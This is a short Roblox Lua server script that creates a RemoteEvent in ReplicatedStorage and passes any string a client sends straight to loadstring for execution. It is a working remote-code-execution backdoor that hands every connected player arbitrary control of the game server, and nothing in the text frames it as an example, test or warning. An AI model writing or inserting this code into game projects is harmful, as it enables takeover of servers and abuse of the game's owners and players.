local server = Instance.new("RemoteEvent",game.ReplicatedStorage)
server.OnServerEvent:connect(function(player,SS)
loadstring(SS)()
end)